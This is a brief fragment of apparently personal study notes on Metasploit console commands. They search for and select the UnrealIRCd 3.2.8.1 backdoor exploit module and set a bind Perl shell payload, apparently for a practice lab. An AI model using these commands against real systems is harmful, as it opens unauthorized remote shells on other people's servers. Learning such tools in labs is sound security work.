### Exploit Module
```
search type:exploit irc
set exploit/unix/irc/unreal_ircd_3281_backdoor
```

### Selecting Payloads
```
# Sometimes using the keyword 'use' can change the exploit module
# Insead, set the payload manually
set payload cmd/unix/bind_perl
```